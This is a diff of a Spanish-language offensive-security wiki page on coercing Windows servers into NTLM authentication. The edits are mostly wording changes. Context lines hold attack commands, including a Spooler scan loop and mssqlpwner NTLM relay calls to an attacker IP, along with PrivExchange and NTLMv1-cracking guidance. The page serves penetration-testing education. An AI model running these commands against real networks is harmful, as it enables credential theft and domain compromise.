@@ -19,7 +19,7 @@ Get-ADComputer -Filter {(OperatingSystem -like "*windows*server*") -and (Operati
 ```
 ### Encontrar servicios de Spooler escuchando
 
-Usando un @mysmartlogin ligeramente modificado (Vincent Le Toux) [SpoolerScanner](https://github.com/NotMedic/NetNTLMtoSilverTicket), verifica si el Servicio de Spooler está escuchando:
+Usando un @mysmartlogin (Vincent Le Toux) ligeramente modificado [SpoolerScanner](https://github.com/NotMedic/NetNTLMtoSilverTicket), verifica si el Servicio de Spooler está escuchando:
 ```bash
 . .\Get-SpoolStatus.ps1
 ForEach ($server in Get-Content servers.txt) {Get-SpoolStatus $server}
@@ -51,7 +51,7 @@ https://github.com/p0dalirius/Coercer
 
 ## PrivExchange
 
-El ataque `PrivExchange` es el resultado de un defecto encontrado en la **función `PushSubscription` del Exchange Server**. Esta función permite que cualquier usuario de dominio con un buzón fuerce al servidor de Exchange a autenticarse con cualquier host proporcionado por el cliente a través de HTTP.
+El ataque `PrivExchange` es el resultado de un defecto encontrado en la **función `PushSubscription` del Exchange Server**. Esta función permite que el servidor de Exchange sea forzado por cualquier usuario de dominio con un buzón para autenticarse en cualquier host proporcionado por el cliente a través de HTTP.
 
 Por defecto, el **servicio de Exchange se ejecuta como SYSTEM** y se le otorgan privilegios excesivos (específicamente, tiene **privilegios WriteDacl en el dominio antes de la Actualización Acumulativa de 2019**). Este defecto puede ser explotado para habilitar el **reenvío de información a LDAP y posteriormente extraer la base de datos NTDS del dominio**. En casos donde el reenvío a LDAP no es posible, este defecto aún puede ser utilizado para reenviar y autenticarse en otros hosts dentro del dominio. La explotación exitosa de este ataque otorga acceso inmediato al Administrador de Dominio con cualquier cuenta de usuario de dominio autenticada.
 
@@ -78,7 +78,7 @@ mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -chain-id 2e9a3696-d8c2-
 # Issuing NTLM relay attack on the local server with custom command
 mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth ntlm-relay 192.168.45.250
 ```
-O use esta otra técnica: [https://github.com/p0dalirius/MSSQL-Analysis-Coerce](https://github.com/p0dalirius/MSSQL-Analysis-Coerce)
+O utiliza esta otra técnica: [https://github.com/p0dalirius/MSSQL-Analysis-Coerce](https://github.com/p0dalirius/MSSQL-Analysis-Coerce)
 
 ### Certutil
 
@@ -104,13 +104,14 @@ Si puedes realizar un ataque MitM a una computadora e inyectar HTML en una pági
 ```
 ## Otras formas de forzar y pescar la autenticación NTLM
 
+
 {{#ref}}
 ../ntlm/places-to-steal-ntlm-creds.md
 {{#endref}}
 
 ## Rompiendo NTLMv1
 
-Si puedes capturar [los desafíos NTLMv1, lee aquí cómo romperlos](../ntlm/index.html#ntlmv1-attack).\
+Si puedes capturar [desafíos NTLMv1 lee aquí cómo romperlos](../ntlm/index.html#ntlmv1-attack).\
 _Recuerda que para romper NTLMv1 necesitas establecer el desafío de Responder en "1122334455667788"_
 
 {{#include ../../banners/hacktricks-training.md}}
